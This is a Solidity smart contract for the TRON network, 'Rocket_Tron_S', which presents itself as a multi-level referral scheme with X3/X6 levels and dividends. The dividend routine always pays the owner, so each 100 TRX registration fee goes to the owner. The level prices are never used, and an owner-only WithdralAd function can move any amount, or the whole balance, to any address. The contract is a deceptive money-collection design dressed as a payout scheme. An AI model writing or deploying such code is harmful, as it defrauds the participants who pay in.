//SourceUnit: rockettron.sol

pragma solidity >=0.4.23;

contract Rocket_Tron_S {
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => bool) activeX6Levels;
        
        
    }
    
   
    uint8 public constant LAST_LEVEL = 14;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances; 
    mapping(address => uint) public TotSponser; 
    uint16 internal constant LEVEL_PER = 2000;
    uint16 internal constant LEVEL_DIVISOR = 10000;

    uint public lastUserId = 2;
    address public owner;
    address public deployer;
    
    mapping(uint => uint) public levelPrice;
    uint8 public constant levelIncome = 10;
    
      event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
   // event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId,uint userToto,uint refTot);
    event SentDividenddds(address indexed from,uint indexed fromId, address indexed receiver,uint receiverId, uint8 level, bool isExtra);
    
    constructor(address ownerAddress) public {
        levelPrice[1] =  100 trx;
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
        }        
        owner = ownerAddress;
        deployer = msg.sender;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
        }
        
        userIds[1] = ownerAddress;
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }

     function WithdralAd(address userAddress,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
         address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }


    function registrationDeployer(address user, address referrerAddress) external payable {
        require(msg.sender == deployer, 'Invalid Deployer');
        registration(user, referrerAddress);
    }
    
    function registration(address userAddress, address referrerAddress) private {
        if(!(msg.sender==deployer)) require(msg.value == 100 trx, "registration cost 100");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        
        

      
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
		sendTronDividenddds(owner, msg.sender,1);
		
    }
    
   
    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }

    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }

    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
	
	function findTronReceiverdd(address userAddress, address _from, uint8 level) private returns(address, bool) {
        
        address receiver = userAddress;

        bool isExtraDividends;
        
         return (receiver, isExtraDividends);


    }

	
	function sendTronDividenddds(address userAddress, address _from,  uint8 level) private {
        

        (address receiver, bool isExtraDividends) = findTronReceiverdd(userAddress, _from, level);

           uint AMTTX;
           AMTTX=100000000;
        if (!address(uint160(receiver)).send(AMTTX)) {

            return address(uint160(receiver)).transfer(address(this).balance);

        }

       

        emit SentDividenddds(_from,users[_from].id, receiver,users[receiver].id, level, isExtraDividends);

    }

    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}